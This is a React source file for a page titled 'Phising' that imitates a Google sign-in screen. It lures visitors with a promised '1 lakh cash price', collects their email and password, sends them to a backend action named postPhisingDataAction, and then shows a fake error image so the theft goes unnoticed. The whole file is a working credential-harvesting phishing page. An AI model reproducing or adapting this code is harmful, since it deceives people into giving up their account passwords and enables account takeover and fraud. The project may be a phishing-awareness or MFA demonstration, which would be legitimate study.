import React from 'react';
import { makeStyles } from '@material-ui/core/styles';
import Paper from '@material-ui/core/Paper';
import Button from '@material-ui/core/Button';
import Typography from '@material-ui/core/Typography';
import { Box, TextField } from '@material-ui/core';
import { useDispatch, useSelector } from 'react-redux';
import { postPhisingDataAction } from '../src/features/mfa/mfaSlice';
import { selectLoadingState } from '../src/features/auth/authSlice';

function Copyright() {
  return (
    <React.Fragment>
      <Typography variant='body2' component='span' color='textSecondary'>
        {'English (United States)'}
      </Typography>

      <Typography
        style={{ float: 'right', paddingLeft: 8 }}
        variant='body2'
        component='span'
        color='textSecondary'
      >
        {'Help'}
      </Typography>
      <Typography
        style={{ float: 'right', paddingLeft: 8 }}
        variant='body2'
        component='span'
        color='textSecondary'
      >
        {'Privacy'}
      </Typography>
      <Typography
        style={{ float: 'right', paddingLeft: 8 }}
        variant='body2'
        component='span'
        color='textSecondary'
      >
        {'Terms'}
      </Typography>
    </React.Fragment>
  );
}

const useStyles = makeStyles((theme) => ({
  layout: {
    width: 'auto',
    marginLeft: theme.spacing(3),
    marginRight: theme.spacing(3),
    [theme.breakpoints.up(600 + theme.spacing(2) * 2)]: {
      width: 600,
      marginLeft: 'auto',
      marginRight: 'auto',
    },
  },
  paper: {
    marginTop: theme.spacing(3),
    marginBottom: theme.spacing(3),
    padding: theme.spacing(2),
    [theme.breakpoints.up(600 + theme.spacing(3) * 2)]: {
      marginTop: theme.spacing(6),
      marginBottom: theme.spacing(6),
      padding: theme.spacing(3),
    },
    border: '2px solid #F4F6F8',
  },
  stepper: {
    padding: theme.spacing(3, 0, 5),
  },
  buttons: {
    display: 'flex',
    justifyContent: 'flex-end',
  },
  button: {
    marginTop: theme.spacing(3),
    marginLeft: theme.spacing(1),
  },
  customTypo: {
    fontWeight: 500,
  },
  customSpacing: {
    marginTop: theme.spacing(3),
  },
  createSpacing: {
    marginTop: theme.spacing(2),
  },
}));

export default function Phising() {
  const classes = useStyles();
  const dispatch = useDispatch();
  const isLoading = useSelector(selectLoadingState);
  const [values, setValues] = React.useState({
    email: '',
    password: '',
  });
  const [isError, setError] = React.useState(false);

  const handleSubmit = (e) => {
    e.preventDefault();
    let payload = {
      email: values.email,
      password: values.password,
    };
    dispatch(postPhisingDataAction(payload));
    setError(true);
    setTimeout(() => {
      setError(false);
    }, 3000);
  };

  const handleChange = (e) => {
    setValues({
      ...values,
      [e.target.name]: e.target.value,
    });
  };

  return (
    <React.Fragment>
      {isError ? (
        <img src='/assets/error.png' alt='logo' />
      ) : (
        <main className={classes.layout}>
          <Paper className={classes.paper}>
            <Box align='center'>
              <img
                height='60'
                width='120'
                src='/assets/phising_logo.png'
                alt='logo'
              />
            </Box>
            <Typography
              className={classes.customTypo}
              variant='h5'
              component='h1'
              align='center'
            >
              Sign In
            </Typography>
            <Typography
              variant='subtitle1'
              align='center'
              className={classes.customTypo}
            >
              Sign in to google to avail the 1 lakh cash price.
            </Typography>
            <form onSubmit={handleSubmit}>
              <TextField
                className={classes.customSpacing}
                id='email-or-phonenumber'
                label='Email or phone'
                variant='outlined'
                fullWidth
                type='email'
                name='email'
                value={values.email}
                onChange={handleChange}
              />
              <TextField
                className={classes.customSpacing}
                id='password'
                label='Enter your password'
                variant='outlined'
                type='password'
                name='password'
                value={values.password}
                onChange={handleChange}
                fullWidth
              />
              <Typography
                className={classes.customTypo}
                style={{ marginTop: 10, color: '#1a73e8' }}
              >
                Forgot email?
              </Typography>
              <Box mt={5}>
                <Typography
                  className={classes.customTypo}
                  style={{ marginTop: 10 }}
                >
                  Not your computer? Use Guest mode to sign in privately.
                </Typography>
                <Typography
                  className={classes.customTypo}
                  style={{ color: '#1a73e8' }}
                >
                  Learn more
                </Typography>
              </Box>
              <Box mt={5}>
                <Button
                  fullWidth
                  variant='contained'
                  style={{
                    backgroundColor: '#1a73e8',
                    color: '#ffffff',
                  }}
                  type='submit'
                  disabled={isLoading}
                >
                  Sign In
                </Button>
              </Box>
            </form>
          </Paper>
          <Copyright />
        </main>
      )}
    </React.Fragment>
  );
}
